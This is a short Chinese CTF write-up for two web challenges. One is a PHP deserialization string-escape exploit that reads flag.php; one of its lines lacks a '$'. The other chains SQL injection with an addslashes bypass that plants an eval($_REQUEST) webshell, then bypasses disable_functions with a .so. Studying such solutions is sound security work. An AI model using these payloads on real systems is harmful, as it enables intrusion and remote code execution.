# 安恒五月月赛部分题解

## Web1

read(write()) 变长逃逸

Exp
```php
<?php
#show_source("index.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read($data) {
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}

#$a = new A($_GET['a'],$_GET['b']);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
#$b = unserialize(read(write(serialize($a))));

$c = new C;
$c->c = "flag.php";
$b = new B;
$b->b = $c;
$a = new A('O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}',"233");
$a->username = $b;
echo serialize($b)."\n";
echo "test".serialize($a)."\n";
payload=';s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}';
echo "1111".serialize(new A("233",$payload))."\n";
?>
```

## Web2

第一步 sql格式化字符串注入

第二步 ``addslash`` getshell

```php
<?php%20$option%3d'asd\';%20eval($_REQUEST[eki]);//;%20?>
```

第三步 加载个so，绕过disable_function

